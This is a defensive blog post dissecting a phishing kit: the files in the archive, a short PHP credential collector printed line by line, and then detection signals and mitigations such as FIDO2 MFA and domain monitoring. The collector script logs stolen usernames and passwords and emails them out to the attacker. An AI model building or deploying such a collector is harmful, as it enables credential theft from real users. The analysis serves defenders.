Phishing kits are commodity software: packaged archives that bundle a fake login page, a PHP backend to collect credentials, and a delivery mechanism (usually email). They sell for $10–$50 on underground forums and are the backbone of most credential-harvesting campaigns.

This post walks through a representative kit we obtained from a public underground marketplace. We'll look at what's inside, how it works, and — most importantly — how defenders can spot it.

What's in the archive

A typical kit ships as a ZIP containing:

kit/
  index.html          # fake login page
  login.php           # credential collector
  thank-you.html      # redirect after submit
  assets/
    logo.png
    style.css
  lang/
    en.php
    es.php
  logs/
    hits.txt          # stolen credentials land here

The login.php file is the core. It takes the submitted username and password, writes them to logs/hits.txt, and optionally forwards them to a Telegram bot or email address controlled by the attacker.

The collector, line by line

<?php
$ip  = $_SERVER['REMOTE_ADDR'];
$ua  = $_SERVER['HTTP_USER_AGENT'];
$usr = $_POST['username'];
$pwd = $_POST['password'];

$entry = date('Y-m-d H:i:s') . " | $ip | $ua | $usr | $pwd\n";
file_put_contents('logs/hits.txt', $entry, FILE_APPEND);

// optional exfil
mail($bot_email, 'New catch', $entry);

header('Location: thank-you.html');
?>

That's it. No obfuscation, no encryption, no database. The attacker simply re-uploads the kit to a fresh domain, sends the link, and checks hits.txt periodically.

Detection signals

Defenders can catch these kits with a few reliable signals:

  • Fresh domains — kits land on newly registered domains. Check against WHOIS age.
  • Generic file structure — the login.php + thank-you.html pattern is extremely common.
  • Plaintext credential storage — hits.txt is often left world-readable and unauthenticated.
  • Default assets — many kits ship with the same stock logo and CSS. Hash matching catches clones.

Defensive recommendations

  • Deploy FIDO2/phishing-resistant MFA — credential harvesting alone isn't enough.
  • Use email authentication (SPF, DKIM, DMARC) and sandboxed link rewriting.
  • Monitor newly-registered domains in your brand's namespace and file takedown requests quickly.
  • Run canary credentials through your SIEM — if a test account logs in from an unexpected IP, alert.

Phishing kits are low-effort, high-volume tools. The defense isn't glamorous, but it works: reduce the value of stolen credentials and shrink the window between deployment and detection.
